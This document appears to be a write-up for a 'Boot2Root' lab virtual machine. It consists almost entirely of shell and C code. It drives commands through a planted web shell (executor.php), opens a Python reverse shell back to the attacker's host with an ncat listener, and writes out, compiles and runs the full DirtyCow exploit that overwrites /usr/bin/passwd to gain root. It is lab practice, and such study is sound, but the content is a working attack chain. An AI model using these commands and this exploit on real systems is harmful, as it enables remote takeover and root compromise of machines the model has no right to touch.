## Find our HOST machine IP
```shell
HOST_IP=`ifconfig en0 | grep inet | awk '{print $2}'`
echo $HOST_IP
```

## Find our VM IP
```shell
IP=`prlctl list -f | grep "Boot2Root" | awk '{print $3}'`
echo $IP
```

Declare executor
```shell
executor () {
  cmd=`echo "$1" | sed 's/ /%20/g'`
  curl -s -k https://$IP/forum/templates_c/executor.php?execute=$cmd
}
reverse_shell () {
  screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
  screen -dmS ncat bash -c 'sleep 1; ncat -nvklp 1234'
  reverse_shell_cmd="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST_IP\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/bash\");'"
  sleep 3
  executor $reverse_shell_cmd &
  screen -r ncat && kill %2
}
```

### Run reverse shell
```shell
reverse_shell
```

### c0w exploit
##### Write c0w source code
```shell
echo '''
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

char suid_binary[] = "/usr/bin/passwd";

unsigned char shell_code[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;

void *madviseThread(void *arg) {
  int i,c=0;
  for(i=0;i<200000000;i++)
    c+=madvise(map,100,MADV_DONTNEED);
  printf("madvise %d\n\n",c);
}


int main(int argc,char *argv[]){

  printf("                                \n\
   (___)                                   \n\
   (o o)_____/                             \n\
    @@ `     \\                            \n\
     \\ ____, /%s                          \n\
     //    //                              \n\
    ^^    ^^                               \n\
", suid_binary);
  char *backup;
  printf("DirtyCow root privilege escalation\n");
  printf("Backing up %s to /tmp/bak\n", suid_binary);
  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
  system(backup);

  f=open(suid_binary,O_RDONLY);
  fstat(f,&st);
  map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pid=fork();
  if(pid){
    waitpid(pid,NULL,0);
    int u,i,o,c=0,l=sc_len;
    for(i=0;i<10000/l;i++)
      for(o=0;o<l;o++)
        for(u=0;u<10000;u++)
          c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));
    printf("ptrace %d\n\n",c);
   }
  else{
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);
    pthread_join(pth,NULL);
    }
  return 0;
}
''' > /tmp/c0w.c
```

##### Compile binary
```shell
executor "gcc /tmp/c0w.c -o /tmp/c0w -pthread -lcrypt"
```

##### Execute binary
```shell
executor "rm -f /tmp/passwd.bak"
echo $IP > ../scripts/writeup1/ip
screen -dm bash -c 'sleep 1; bash ../scripts/writeup1/executor.sh "/tmp/c0w" `cat ../scripts/writeup1/ip`'
sleep 5
rm ../scripts/writeup1/ip
screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
sleep 30
```

#### Check result
```shell
executor "echo 'whoami' | /usr/bin/passwd"
```

We are root!